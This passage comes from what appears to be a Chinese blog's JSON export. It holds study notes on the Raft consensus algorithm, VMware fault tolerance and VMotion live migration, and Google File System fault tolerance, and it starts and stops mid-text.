由于一些原因还没有同意增加节点，此时它还是认为集群中只有 3 个节点，所以只要有 2 个节点达成一致，那么整个集群就是一致的。 这会导致什么问题呢？如果 1 和 4 同时发起选举，1 很可能共得到 2 个投票，4 则会得到 3 个投票，由于实际集群中有 5 个节点，所以 4 会成为 Leader 是符合 Raft 对大多数的定义的；但由于 1 仍然认为集群中只有 3 个节点，所以它也会成为 Leader。同一个集群中出现了两个 Leader，也就是发生了脑裂，Raft 作为一个对 Leader 强依赖的算法，在这样的情况下就无法保证一致性了。 怎么解决这个问题呢？Raft 提供了两种思路，这里仅对易于工程实现的思路做解释。具体来说，Raft 规定不论是增加节点还是删除节点，每次都只能操作一个节点。这就可以保证即便集群中的节点对节点总数的判断不一致也不会出现脑裂的情况，因为整个集群中对于“大多数”的判断只会有两个答案，比如原来有 4 个节点，为了选出 Leader 就需要获得 3 个节点的投票，现在变成 3 个节点就需要获得 2 个节点的投票，而两类节点的“大多数”之和会大于原来集群中节点的数量，即 2 + 3 = 5 &gt; 4，所以一定会有一个节点同时属于两个“大多数”，这个节点就是非常关键的角色，它的投票会影响系统的最终结果。如前所述，节点数量的变化需要经过“大多数”节点的同意，所以这个关键的节点一定知道集群数量的变化，那么它一定会把票投给知道集群数量变化的那个 Candidate 来帮助它成为 Leader。 可以证明，对于新增节点的场景也是类似的，那个关键的节点会把票投给更新的 Candidate。怎么定义哪个 Candidate 更新呢，要用它所拥有的日志来判断。 Raft 的日志我们前面提到，Raft 算法是服务于分布式状态机的。那么对于状态机本身而言，就需要有一种机制可以同步状态的变化，通常而言就是日志。与客户端直接交互的节点会更新自己的日志，然后将新的日志同步给其他的 replica 们，这些 replica 接收到日志后在本地重放（replay），最终其内部的状态就会与其他节点达成一致。 发送日志的时机取决于系统本身的要求，我们曾讨论过同步发送和异步发送的利弊。对于 Raft 这样一个聚焦于一致性的算法，它选择在执行命令前先同步日志，也就是所谓的 WAL。但与其他系统不同的是，Raft 在日志同步上也仅需要达成大多数的一致，比如集群中有 5 个节点，那么它只需要成功同步给其中的 2 个节点，加上它自己本地的一份，整个集群中就有 3 个节点对日志达成一致，这在机制上就可以保证一致性了。通过这种方式，采用 Raft 的系统在同步日志的效率上不会受制于那些 struggler，也就是因为各种原因显著慢于其他节点的节点。 我们前面提到为了保证一致性，采用 Raft 的系统的读写都要通过 Leader 来完成。我们假设使用 Raft 的是一个分布式 kv 系统，那么它所支持的最基本的操作就是 get/set。当一个节点成为 Leader 后，它就会开始接收来自客户端的请求。收到请求后，Raft 模块会把这个命令以 Log Entry 的形式追加进自己的本地日志中，然后发送 AppendEntries 的 RPC 来将日志同步给其他节点，当收到大多数节点的同意后，Raft 模块会把相关状态同步给应用层，在这种情况下应用层就会将命令的效果应用在本地状态机中，然后把最终结果返回给客户端。 每个 Log Entry 会有它自己的下标、创建它时系统的任期号（是当时的 Leader 以为的任期号，实际可能不准确）以及包含的命令。通常情况下，Leader 和 Follower 的日志应该是一致的，但 Raft 把不一致视为必然现象，那么怎么定义不一致呢，大体有两类。首先第一种就是日志的长度不一致，比如前面提到的 struggler，这些节点通常只有 Leader 节点上前半部分的日志，后面的部分由于各种原因还没有被同步过来；另一种就是同一个下标对应的 Log Entry 不同，导致这一现象的原因有很多，比如 Leader 收到命令 put x 1 来将 x 写入 1，但它在将对应的 Log Entry 追加到本地后就发生了网络分区，在它离线期间其他节点中选出了新的 Leader，并收到了 put x 2 的命令并成功同步，此时旧的 Leader 在同样的位置上的 Log Entry 就与其他节点不一致。 Raft 怎么处理这种不一致呢？首先在前面我们提到，选举 Leader 时，节点在投票时要考虑两方面的因素，第一是目标 Candidate 的本地任期号是否大于自己，第二是目标 Candidate 是否有比自己更新的的日志。这里的更新有两个含义，如果 Log Entry 的任期号相同，那么具有更大下标的日志更新；如果日志的下标相同，那么具有更高任期号 Log Entry 更新。可以发现，这其实就是对齐了前面提到的两种不一致。因为只有具有更新的日志的节点才有机会成为 Leader，而客户端的读写又通过 Leader 进行，所以客户端还是可以读到更新的结果。另一方面，Leader 采用 AppendEntries 来做心跳检测，这个 RPC 本身就是用来同步日志的。通过这个机制，Leader 是可以发现 Follower 的日志与自己日志间的不一致的。在这种情况下，Leader 会对不一致的部分进行调整，少日志就加，错日志就覆写，最终 Follower 的日志状态就会和 Leader 达成一致。 和其他依赖日志的系统一样，随着系统的运行日志会变得越来越大，最终耗尽持久化设备的空间。Raft 对这种问题的解决方案是 snapshot，就是把当前已有的日志通过某种方式变成一个等价的、但是占用空间更少的表现形式，实现这种效果的方案有很多。比如对于一个使用 Raft 的分布式 kv 系统而言，就可以采用类似 Redis 的 AOF 重写的机制。具体而言，如果日志中的内容包含对同一个键的一系列操作，那么最终有效的其实只有最后一个操作，所以只需要在日志中保留这个值的最终状态即可。论文中把这个操作称为 Log Compaction，也就是日志的“压实”，我觉得这个词还是非常贴切的。 那么会不会出现经过 Log Compaction 后，日志占用的磁盘空间还是很大的情况呢？我觉得这种情况是很少的，因为如果距离上一次压实后（我们称它为 snapshot）并没有新的命令被执行，那么实际上内存中的状态和 snapshot 是一致的。对于一个使用 Raft 的分布式 kv 系统而言，snapshot 里记录的大概就是每个 key 对应的 value 是什么，这和内存中的信息是一样的，如果这些信息都可以被保存在内存中，那么保存在持久化设备上就不是什么大问题了。 一些细节接下来讨论一些其他方面的问题。 首先，我们前面提到，为了保证一致性，采用 Raft 的系统的读写都需要在 Leader 上进行，但是读操作为什么需要呢？可以确定的是，从 Raft 系统中读出的内容一定是被“大多数”节点承认的内容，因为只有被多数节点承认，这个内容才会被应用到状态机中。但是尽管这个内容是被承认的，它也有可能是过期的，比如如果允许从 Follower 上读取内容，那么与客户端交互的有可能就是一个 struggler，也就是说它内部的日志是延后于其他节点的。那么此时客户端通过它来读取，就可能读到曾经的某个时刻有效、但是在当前实际已经被修改的值。而这其实就回到了主从复制系统的一个共有问题，也就是同步延迟带来的问题，一些业务场景是可以容忍这短暂的不一致的。因此，如果不要求读的强一致性，那么读操作也不是一定要发生在 Leader 上的。 那么，是不是只要从 Leader 上读取，就一定可以读到最新的内容了呢？原理上是这样的，但是问题在于 Leader 并不能很轻易地判断它自己是不是 Leader。比如说，曾是 Leader 的节点与其他节点间发生了网络分区，导致其他节点因为收不到它的心跳而开始选举新的 Leader，并在选举成功后写入了新的内容。那么对于那些还在与旧 Leader 交互的客户端而言，它们与旧 Leader 都没有意识到新 Leader 的产生，如果此时旧 Leader 直接从自己的状态机中取出对应的状态返回给客户端，那么这其实就和上面提到的直接从 Follower 上读取是一样的场景了。 所以为了保证一致性，读操作也要写入日志，并且通过 Raft 模块同步到其他节点上，只有得到多数节点的同意，Leader 才能确保它确实是 Leader，然后放心地将自己状态机中的状态返回给客户端。把读操作放进日志中可能看起来有些奇怪，但是本身日志的内容就不是既定的，比如 etcd 的 Raft 模块中甚至有 Dummy Log Entry，用来避免论文 Figure8 描述的现象，这里就先不展开了。 另一个问题是，当客户端发送了更新状态的命令给 Leader，那么 Leader 将其写入日志后会同步到其他节点，如果同步失败了会怎样？当有新的客户端发送其他更新状态的命令时，Leader 会用这个命令对应的日志将前面同步失败的日志覆盖掉吗？对于这个问题，论文的 Figure3 里明确说明了 Leader 是 Append-Only 的，也就是不会覆写自己日志中已有的内容（但是会覆写其他节点的，因为它是老大它说得算）。可是，这样一来不就有脏数据在日志中了吗，因为同步失败时 Leader 会返回客户端命令执行失败，但是经过几轮心跳检测的 AppendEntries，这个当时被认为失败的日志还是会被同步并应用到其他节点的状态机中，此时系统的状态就和客户端预期的不一致了。 我觉得这个问题还是应该看具体的场景，比如还是以分布式 kv 系统举例，那么客户端在收到命令执行失败的响应后可以直接发起重试，因为它的操作是幂等的，这次重试对应的日志会被放在失败的那条日志后面，并且被同步到其他节点上，这时的这个日志是被认为有效的，前面的那条被客户端认为失败的日志可以简单地理解为被后面的日志覆盖掉了，这其实也是 kv 系统的日志可以做 Log Compaction 的原因，因为对于同一个 key 而言，最后一次的操作才是其最终的状态。","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"}],"tags":[]},{"title":"浅析虚拟机容错与不停机迁移","slug":"vm-ft","date":"2022-07-12T04:43:57.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2022/07/12/vm-ft/","link":"","permalink":"/2022/07/12/vm-ft/","excerpt":"","text":"VMware-FT 论文下载：下载链接 VMware-VMotion 论文下载：下载链接 前言自 4.0 版本开始，VMware vSphere 平台提供虚拟机的容错（VMware vSphere Fault Tolerance）功能，该功能参考了复制状态机（RSM）模型，实现了两台单核虚拟机的状态同步。同步的结果是当作为 primary 的虚拟机宕机时，曾经的 backup 虚拟机可以快速接替它成为新的 primary，而这种切换对上层应用是透明的。对于后人来说，这是一个学习复制状态机模型的绝佳例子，本文将记录我在阅读相关论文时的一些思考与总结。 复制状态机概述在前面讨论 GFS 时我们提到，为了避免 Master 造成单点故障，GFS 以同步+异步的方式将 primary Master 的操作日志发送到其他服务器上，这些服务器通过回放（replay）接收到的操作日志，就可以达成和 primary 一致的状态。 这种通过传递操作在多个节点间达成一致的方式就被称为复制状态机，与之相对的还有一种同步方式叫做“状态复制”，这种方式通过传递状态来达成一致，在 GFS 的场景下 checkpoint 的传递就可以理解为是一种“状态复制”。所以相对而言，复制状态机每次传递的数据量是比较小的。 复制状态机的总体思路是这样的，如果两个状态机从同一个状态开始接收一系列相同的确定性输入，那么它们最终会达成相同的状态。什么叫做确定性输入呢，比如我们有函数 Now() 用于获取调用这个函数时系统的时间，那么“调用 Now()，并将它的返回值赋给 X”这个操作就不是确定性的，因为两个状态机可能会在不同的时间收到这个指令，而指令执行时间的不同会导致 Now 的返回值不同，进而导致 X 的值不一致。 所以利用复制状态机来做状态同步的系统需要特别处理那些不是确定性的输入，比如在 primary 上执行“调用 Now()，并将它的返回值赋给 X”这个指令，但是记录下 Now 的返回值，比如是 123456，然后在 backup 上则执行“将 123456 赋值给 X”的指令，从而达成两个状态机的同步。 VM FT 原理论文第 4 节给出了两种非默认的实现，为了方便，这里仅讨论 VM FT 的默认实现，也就是 Shared Disk 以及不在 backup 上执行实际的读盘操作。 首先要明确的是，VMware vSphere 是一个全虚拟化平台，这意味着虚拟机看到的 cpu、内存、外设等都是由 Hypervisor 模拟出来的，因此虚拟机的方方面面对 Hypervisor 而言都是可见且可控的。在这样的虚拟化方案下，如果将 VM FT 的功能实现在 Hypervisor 上，就可以达到“任何操作系统不经过任何改动就可以使用 VM FT 的功能”的效果。 总体而言，vSphere 会被部署在集群上，集群中的每个物理节点运行 Hypervisor，Hypervisor 上运行各个虚拟机。Hypervisor 本质上只是服务器上的进程，所以对于一个开启了 VM FT 的虚拟机而言，它的 primary 和 backup 不应该被运行在同一台物理机上，因为一旦这个物理机宕机，primary 和 backup 就同时失效了。 primary 虚拟机所在的 Hypervisor 会与 backup 所在的 Hypervisor 通信，这种通信是通过在 Logging Channel 上传输 Log Entry 来实现的。所有的外部输入都会被发送到 primary，而 primary 将输入封装成确定性的 Log Entry 发送给 backup，所以 backup 的状态变化是由 primary 发来的 Log Entry 驱动的，它本身不直接接受外部输入。而对外的输出同样都由 primary 产生，backup 的输出会被 Hypervisor 直接屏蔽掉。 在默认实现上，集群中的物理节点使用 Shared Disk，这可能是 NFS 或 iSCSI 协议背后的存储集群。通过共享存储，primary 虚拟机不需要将磁盘变化同步给 backup，这一方面减少了状态同步的开销，一方面又可以为存储集群配置单独的容错策略，从而和应用解耦。 那么 backup 如何知道 primary 发生错误导致退出了呢？首先，primary 执行过程中遇到的中断也同样会被发送给 backup，而在所有的中断中，时钟中断是会定期发生的，所以如果 primary 能够正常执行，由于时钟中断的存在，backup 不会很长时间收不到 Log Entry。反过来说，如果 backup 很久（理论上指大于“两次时钟中断之间的间隔时间加网络传输时间”的时间，但论文中说通常设为几秒）没收到 Log Entry，那么就可以认为 primary 出了问题，此时 backup 会接替它成为 primary。除了这个机制，vSphere 还让 primary 和 backup 的 Hypervisor 保持心跳检测，以进一步检测 primary 的问题。 这一切都显得非常美好且合理，但是正如前文所述，除了让两个复制状态机保持接收相同的确定性输入外，它们还需要从一个相同的状态开始接收才可以保证它们进入到相同的新状态。但是当 primary 异常，backup 成为新的 primary 时，系统需要创建一个新的虚拟机并让它成为新的 backup。这个新的虚拟机要如何才能达成与当时的 primary 一致的状态呢？这就是 VM VMotion 的工作了。 VMotion 原理VM VMotion 需要做到的是将某个虚拟机从其所在的源物理机上迁移到另一台物理机上，在迁移过程中不需要完全停机，虚拟机的使用者也很难感知到这个迁移动作的发生。 那么迁移具体指什么呢？本质上讲，这个过程是在另一台物理机上启动一个新的虚拟机，但是这个虚拟机的 cpu、外设、网络、硬盘、内存状态都与源虚拟机完全一致。如果将源虚拟机删除，那么这被称为迁移，如果保留源虚拟机，那么这被称为克隆。VM FT 使用的是克隆，但是其原理和迁移几乎是一样的，所以后面的讨论中以迁移举例。 大体而言，VMotion 会经历如下步骤： 选定需要被迁移的虚拟机以及目标物理机； 在保持虚拟机运行的状态下，预复制（Pre-copy）虚拟机的内存到目标物理机上； 暂停虚拟机的运行，然后复制除内存外的其他状态，这通常只需要很短的时间； 复制剩余的内存，然后在目标物理机上让虚拟机运行。 可以发现在整个过程中，有两个阶段都是针对内存的复制。之所以会有这样的情况，是因为内存其实是最难被复制的状态，因为首先内存的容量通常都比较大，这使得先暂停虚拟机再复制内存的方式变得不可行，因为复制所需的时间会很长，导致虚拟机停机的时间也会很长，这对虚拟机中的应用而言是不可接受的。另一方面，内存又是一个会随着虚拟机的运行而不断变化的组件，所以虚拟机是一定要被暂停的，否则传输变化的速度很难超过产生变化的速度，这样永远都不能完成迁移。 那么为了尽可能减少对虚拟机内应用的影响，就需要让虚拟机暂停的时间尽可能少，如何做到这一点呢？答案是局部性原理。具体而言，操作系统把内存按页划分，在很短的时间中内存的变化会聚集在几个页面里。基于这个原理，我们就可以在不停机的状态下先将完整的内存空间复制到目标物理机上，由于完整的内存很大，这通常是一个比较耗时的操作。而每个页面在传输后一旦发生变化就会被记录下来，这对一个全虚拟化平台而言可以很容易地做到。在上面的第 3 步时，为了复制除内存外的其他状态（比如虚拟 cpu 中各个寄存器的值），就需要将虚拟机暂停，到此为止我们已经记录了一些变化过的页面，而由于虚拟机已经暂停，从此之后就不会再有变化的页面。此时系统就可以将这些变化的页面传输到目标物理机上，如前所述，由于局部性原理，这些页面的数量通常是比较少的，所以传输它们并不会花太多时间。 相较于内存，网络和存储就没有那么困难了。尤其是存储，因为我们使用 Shared Disk，所以只需要让被复制的虚拟机连接存储集群就可以了。而对于网络而言，由于虚拟机的网卡是被 Hypervisor 模拟出来的，多个虚拟网卡可能共享同一个物理网卡，所以不管迁不迁移，物理网卡都照常首发网络包，只是它到虚拟网卡的映射被 Hypervisor 修改，使得网络包被发送到了新的虚拟机上。 由于网络流量可以平滑地被迁移到另一台虚拟机上，而这台虚拟机又有着与源虚拟机完全相同的内存状态，这意味着它们打开的 TCP 连接等状态也是一致的，所以应用并不会因为迁移操作而受到什么影响。 所以总结来说，VMotion 可以创建一个与源虚拟机完全一致的复制虚拟机，这使得复制状态机“一致的初始状态”的条件就可以通过它来达成了。 VM FT 的一些细节Hypervisor 为开启 VM FT 的虚拟机维护了一个 Buffer 用于发送和接收 Log Entries。Primary 将状态变化（具体内容见下文）封装成确定性的 Log Entry，然后写入到 Buffer，通常情况下它完成这个写入就可以继续执行。Buffer 有点类似于 TCP 的滑动窗口，里面的 Log Entry 会被异步发送到 backup 的 Buffer 中。每当 backup 处理一个 Log Entry，它就会返回一个 ACK 给 primary，论文中重点强调了这个 ACK 对 Output Rule（见下文）的作用，但我猜 primary 虚拟机的 Buffer 中 Log Entry 应该仅在收到 ACK 时才会被删除，从而留出空间放新的 Log Entry。因为 TCP 只能保证网络包被送达，但是不能保证里面的内容被放入 Hypervisor 为 backup 提供的 Buffer 中。 所以，由于发送速度和处理速度的不均等，primary 的 Buffer 可能会满，backup 的 Buffer 也可能会空。当 backup 的 Buffer 为空时，它需要被暂停执行，与之类似的，当 primary 的 Buffer 为满时，它也需要被暂停执行。在这个过程中，backup 的暂停不会对上面的服务产生影响，因为用户仅与 primary 打交道，他甚至意识不到 backup 的存在，但 primary 的暂停却实打实地会影响到用户的体验。为了避免 primary 比 backup 快出太多，系统会检测它们之间的距离，并在超过一定值时降低 primary 的执行速度，等 backup 追赶上 primary 时再将速度恢复。 说了这么多，那么 Log Entry 到底包含什么内容呢？论文对此并没有给出说明，但 VM FT 是基于复制状态机模型的，所以它不会传递诸如寄存器的值、内存状态等，这些状态的同步通过让两台虚拟机接受相同的确定性输入与事件来达成。 如 2.1 小节所言，输入主要指网络包、读盘、键盘鼠标输入等，事件则主要指中断。其实由于默认配置下 backup 并不会真的读盘，所以它会“读到什么内容”也是通过 Log Entry 来同步的，即如果 primary 读盘获取到了内容 ABCD，那么这个内容会被写入 Log Entry，backup 的 Hypervisor 会通过模拟来让 backup 以为自己读盘并获取到了 ABCD 的内容。与之类似的，由于 backup 也不会收到其他的外设发送的内容，所以这些信息也是通过 Log Entry 来显式传递并被模拟的。 对于中断，要求要更严格一些。首先，操作系统本身其实就是一个被各种中断所驱动的大循环体，所以要想保证两个操作系统的状态一致，那么“在什么指令处发生了什么中断”必须是严格一致的。怎么保证这一点呢，我推测每个 Log Entry 都记录了它被发送时 primary 执行到了什么阶段，而 backup 在重放这个 Log Entry 时，最多只能执行到同样的阶段，也就是说，Log Entry 对 backup 而言就像是调试代码时的断点，backup 的执行并不是连续的。即便 primary 不接受任何的外部输入，由于时钟中断的存在，backup 也能以此来同步 primary 的执行。 此外，虚拟机在读盘时可能会使用 DMA 等异步传输技术。这意味着在虚拟 cpu 收到中断前，有一块内存区域是被协处理器写入的。如果此时我们主动去读取这部分内存，那么由于并发读写的原因获得的结果就会是不确定的。为了避免这样的情况，VM FT 使用 bounce buffer 来处理。具体来说，它使用另一块内存空间用于供协处理器使用 DMA 来读写内容，这块空间对虚拟机而言是不可访问的，在读盘结束时协处理器会触发中断，此时由 Hypervisor 主动将这块内存中的内容拷贝到虚拟机内存中供应用访问，这份内容同样会以 Log Entry 的形式同步给 backup。这其实有点像 MVCC，在整个过程中，虚拟 cpu 与协处理器接触的区域是不一样的，所以它们互不影响。 从上面的描述中可以发现，primary 几乎以异步的方式使用 Logging Channel 来向 backup 同步状态，在之前讨论 GFS 时我们提到，异步同步的缺点在于不能确定操作什么时候被同步以及是否同步成功。那么这种方式会不会造成什么问题呢？考虑这样一个场景，primary 从硬盘读取一些内容，再在相同的地方写入新的内容。这时由于 primary 和 backup 的执行存在时间差，可能 backup 会在 primary 执行写入之后才进行读取，那么此时 backup 读到的内容是否会与 primary 读到的不一致呢？在我们当前的所有讨论中，都以 VM FT 的默认实现方式为准，这种实现方式中 backup 并不会真的去读盘，它读取到的内容实际是被 primary 显式传输再被自己的 Hypervisor 模拟的。也就是说，primary 读取到内容 123，它会发送“让 backup 在 X 这个执行阶段从硬盘中读到 123”这种语义的 Log Entry，backup 的 Hypervisor 在收到它时，会欺骗 backup，让它以为自己真的读取了硬盘并从中获取了 123 这个内容。因为 backup 并不会读盘，所以即便此时硬盘上的内容被更新为 456，也不会对 backup 在 X 这个执行阶段产生任何导致不一致的影响。 另一方面，primary 也不是完全异步地在使用 Logging Channel 的，除了在 Buffer 满时要停下来等待，VM FT 还设置了 Output Rule 的限制。这个限制要求 primary 的所有输出都要在收到 backup 的 ACK 时才能被发送，所以如果用户与 primary 交互并获得了它的反馈时，这个反馈前的所有 Log Entry 都被 backup 重放过了。而这其实就足够了，因为在此之后即便 primary 崩溃了，backup 与 primary 的不一致也不会被用户感知到，因为这种不一致是从上一次的输出开始的，而下一次的输出取决的是当时的 primary，谁又能知道它是谁呢？","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"}],"tags":[]},{"title":"浅析 Google File System（三）","slug":"GFS3","date":"2022-07-05T14:10:36.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2022/07/05/GFS3/","link":"","permalink":"/2022/07/05/GFS3/","excerpt":"","text":"前言前两篇文章主要讨论了 GFS 的架构以及其提供的各种操作的原理，在理想状态下这些组件与功能已经足够上层应用使用了。但是正如论文第 1 节中所描述的，GFS 是工作在上千台普通机器上的分布式系统，所以它应该将“组件会出错”看作是普通事件而不是异常。基于这个理念，GFS 提供了一些机制，以尽可能地减小组件出错对整个系统的影响，本文对此进行讨论。 Master 的容错绝大多数分布式系统都使用 replica 来避免因一个组件或数据发生损坏而影响整个系统，这些 replica 之间通过与 primary（即所有副本中最有发言权的那个）共享一些信息来维持相互之间的一致性，这个共享通常发生在 primary 发生变化时，所以共享的信息就是“发生了什么变化”，具体的形式见下文。传递变化的方式有两种，即同步与异步。 如果采用同步的方式，那么 primary 的操作就会被拖慢，因为它需要等待所有参与共享的 replica 都收到变化并给出响应后才认为操作完成，但更慢的操作带来的是明确的结果，即 primary 可以得知每个 replica 对这次变化的反应；与之相对的，异步传递变化不会对 primary 的操作有明显的时间影响，但 primary 也很难明确地知道其他 replica 对这次变化的反应。 正因为这两种共享方式各有利弊，所以 GFS 对 Master 同时应用了它们。具体来说，Master 会将元信息的变化同步通知给一些机器，这些机器只负责接受这些信息并保存，在 primary 正常时这些机器上并没有另一个 Master 进程。而一旦 primary 发生故障且不可以通过重启本机 Master 进程来恢复，监控系统（这个系统独立于 GFS，也是 Google 内部的一个基础设施）就会在某台此前接收变化的机器上启动一个新的 Master 进程，这个进程在启动后读取之前接收的所有变化，这些变化可以帮助它构建元信息从而变成可以提供服务的状态，此后它将作为 primary 来继续响应客户端的各种请求。 然而由于每台机器的 IP 都是分配好的，在新的机器上启动 Master 就代表着访问 Master 的 IP 会发生变化，为了避免客户端和 ChunkServer 因此而重启，GFS 中使用 DNS 来访问 Master，而一旦 IP 发生变化，这条 DNS 记录就会被修改，由此也就完成了流量的切换。其实这种使用可控的内部 DNS Server 来向上层屏蔽 IP 变化的理念在很多项目中都有用到（比如 K8S），与之类似的还有 Virtual IP 的概念，非常有趣。 同步传输可以保证目标机器一定收到了 primary 的变化，而这些变化又可以帮助新的进程达到和曾经的 primary 同样的内部状态，这样的机制已经将 Master 的故障带来的影响降得很低。但是，为了获得一个可用的新的 Master，整个系统要经历原机器上 Master 进程的重启、选择新机器、新机器上启动 Master、新 Master 读取变化恢复状态、修改 DNS 记录、ChunkServer 上报位置信息等一系列操作，这其实是一个非常耗时的过程，而如果整个系统对 Master 仅有这一种容错机制，那就代表着在这么长的恢复时间中，GFS 将处于一个完全不可用的状态（这里不考虑客户端可能有一些缓存信息，使它暂时不需要与 Master 交互），这是不可忍受的。 因此，GFS 提供了一种 Shadow Master 的机制，具体而言，整个集群中除了 primary 外还有一些机器上运行着 Master 进程，primary 在产生变化时将变化信息异步传递给这些机器，运行在这些机器上的 Master 进程就可以 replay 这些变化，从而达到和 primary 同样的状态。如前所述，异步传输会导致一定的延迟，但这种延迟对 GFS 而言是可以接受的，一方面和变化的内容有关，这个在后文会给出解释；另一方面，这些 Shadow Master 是只读的，也就是说它们只能接受来自客户端的读请求，所以异步传输导致的延迟不会让系统变得混乱（因为没有“写”操作），而客户端要想因这个延迟读取错误的内容，首先需要 primary 发生故障，其次 Shadow Master 还没有同步完相关变化，最后读取的部分恰好要在没同步完的区域中，这已经是很小的概率了。 说了这么多，那么 primary 和其他 replica 究竟同步了什么呢？答案是操作日志，它的原理有点像 InnoDB 存储引擎的 redo 日志，只不过 GFS 的操作日志记录的是元信息的变化。元信息指的就是 Namespace、文件到 chunk handle 的映射以及 chunk 的位置信息，GFS 只记录前两种，最后一种依赖 ChunkServer 的上报。 GFS 提供的很多操作接口都会让元信息发生变化，而一旦它们发生变化，Master 首先要做的就是将它们的变化写入到操作日志中，然后将它们同步发送给一些备份用机器，再异步发送给运行着 Shadow Master 的机器。无故障地做完这些，Master 才会做实际的动作，并响应客户端的请求。这种“先写日志再做操作”的方式被称为 Write Ahead Log，简称 WAL，是一种被广泛应用在各个知名项目中的技术。 操作日志的 replay 可以帮助备份的 Master 进入到一个可用的状态，但如果仅靠这个机制还是有一些问题。比如如果持续地对元信息做修改，就会让操作日志越来越大，时间长了这就是一个很大的存储开销。另一方面，如果每次备份 Master 都需要从操作日志的第一条开始 replay，那么当日志非常长时，这个恢复操作就会非常慢。为了解决这个问题，GFS 又实现了 checkpoint 的机制，原理上还是和 InnoDB 类似，其实也是一种被广泛应用于各个项目中的技术。 具体而言，当操作日志达到一定大小后，GFS 会对 Master 当前的状态做一个 checkpoint，这个 checkpoint 可以快速地让 Master 进入这个确定的状态，论文中的描述是 checkpoint 的组织方式可以快速被映射到 Master 进程的内存空间中。checkpoint 和操作日志一样会被发送到其他机器上供其他 replica 使用。对于一个备份 Master 而言，它在启动时只需要使用最新的 checkpoint 恢复到对应的状态，然后 replay 这个时间点以后的所有操作日志即可，相对于前面提到的从第一条操作日志开始 replay，这种新的方式可以大大减少 Master 的恢复时间。而最新的 checkpoint 之前的所有 checkpoint 与操作日志都可以被删除（当然也可以留着做更好的容错），从而释放出对应的存储空间。 ChunkServer 的容错ChunkServer 的容错表现在当某些 ChunkServer 进程崩溃或其所在的机器损坏时，整个系统依然能够完成对 所有 chunk 的读写操作。在前面的博文中曾提到，这其中最重要的在于 chunk 的 replica。 replica 之间的一致性由写操作来保证（详见上一篇博文），用户可以对 Namespace 上某个节点的 replica 做配置，也就是可以在文件夹和文件两个等级进行配置，这里的配置主要指数量的配置，而 chunk 的具体位置则由 GFS 来决定。论文 4.2 小节中提到，GFS 会将多个 replica 分布在不同的机架（rack）内的机器上，这样做的好处在于，即便因为一些原因导致某个机架直接不可用，GFS 也可以使用其他机架上的 replica 来提供服务。此外，这种分布方式也可以优化客户端的请求，它可以选择一个离自己最近的机器来完成读写操作。但与之相对的，这种分布也意味着客户端做写操作时，网络流量要垮多个机架，这通常是比较慢的，但正如论文 4.2 小节中所说，这是 Google 作出的一种 trade-off。 chunk 的位置并不是不变的，它可能因为 ChunkServer 的负载过高而被迁移到其他机器上，这被叫做 Rebalancing。此外，当 ChunkServer 挂掉或 chunk 的某个 replica 不可用（不可用的原因见下文）时，整个集群中可用的 chunk 就与用户的预期不符（比如用户设置了 3 个副本，但因为有 1 个故障，此时可用的副本数为 2），GFS 也会进行 re-replication，这可能会在其他 ChunkServer 上创建副本。反之，如果集群中的副本数量大于用户的配置，GFS 也会对多余的副本进行删除，这也是一种 re-replication。 这里有一个问题，就是一个 chunk 的所有 replica 是否具有同样的 chunk handle，论文对此并没有给出解释，但我认为在工程上无论是否相同都是可以实现的。而是否相同则会有不同的弊端，如果是相同的，那么用户也许就无法声明大于机器数量的 replica，因为如果机器只有 2 台，而用户声明需要 3 个 replica，那么就一定有一台机器上有两份副本，此时同一台机器上有两个拥有同样 chunk handle 的 chunk，如果不加一个中间层做处理就会有冲突；而如果副本的 chunk handle 是不同的，那么实际可用的 chunk handle 就会变少，因为一个 chunk 的副本就会占用多个 chunk handle。 那么什么情况下 chunk 的副本会变得不可用呢？在 chunk 过期或者损坏的情况。先说过期，这种现象发生在 secondary chunk 所在的 ChunkServer 短暂的宕机后又重启，而在宕机期间，该 chunk 的其他副本发生了写入操作，此时如果 ChunkServer 恢复，那么这个恢复的 chunk 上的数据就和其他机器上的数据不一致，也就是过期了。为了避免这种情况，GFS 提供了版本号的机制，具体来说，Master 为每个 chunk 维护了一个版本号，在发生写入操作时，这个版本号会增加。所以对于一个 chunk 而言，它的每个副本有一个版本号，Master 也有一个对应于这个 chunk 的版本号，通常情况下它们是相同的，而一旦不同，Master 就以集群中最高的那个为基准（Master 上的版本号可能低于 ChunkServer 上记录的，因为 Master 也会宕机），然后删除掉那些旧的 chunk，再 re-replication 出新的 chunk。此外，由于更新操作会有一些延迟，Master 在发送 chunk 的位置信息时也会发送各个副本对应的版本号，这样客户端就可以主动选择最大的那个，避免读取过期的数据。 另一方面，chunk 也可能损坏，这主要表现在磁盘可能会出问题导致保存的数据发生变化，或文件系统在写入数据时也可能发生问题等，总之最终的结果就是 chunk 中保存的数据和用户想要写入的不一致，这也可以被看作是一种 undefind。为了尽可能避免这个问题，GFS 提供了 checksum 的机制，具体而言，一个 64MB 的 chunk 会被分成多个 64KB 的块，每个块有一个对应的 32 位的 checksum。在读取一个 chunk 时，ChunkServer 会对读取的内容重新计算 checksum 并与保存的 checksum 做对比，一旦不一致就会回复一个错误给客户端，此时客户端需要从其他 ChunkServer 上读取这个 chunk，而这个异常也会被通知到 Master，使得它可以对这个 chunk 进行 re-replication。 毫无疑问，这种机制会让 chunk 的读写都受到一定的影响，其中写操作的影响更大一些。由于 Google 内部的追加写操作要远多于随机写，所以 GFS 对追加写操作做了一些优化。先来看普通写，它的作用是“在文件 A 的 X 字节偏移处写入 Y 个字节”，那么写入的这些内容会不同程度地影响 chunk。比如如果写入 64 KB 的内容，那么就可能修改了一个完整的块（这个块是指与一个 32 位的 checksum 对应的块，不是 chunk，下同），也可能修改了两个连续的块，如果写入大于 64 KB 的内容，就可能修改了两个块或三个块，但一定有一个块是被完全覆写的。因此，GFS 的做法是在被修改的所有 chunk 中选择最开始和最后的两个，读取并验证它们的 checksum，如果是正确的才执行写入，否则要先对这两个 chunk 进行 re-replication，然后才能执行写入。之所以要验证首位的两个块，是因为写入操作会重写内部的 checksum，这样即便那些没有被覆写的区域中有数据损坏的问题也不能被发现了。 对于追加写来说，GFS 可以增量地更新当前最后一个块的 checksum，怎么理解这个增量更新呢，比如编程语言中的 md5 计算，会有类似 md5(&quot;1111&quot;).update(&quot;2222&quot;) == md5(&quot;11112222&quot;) 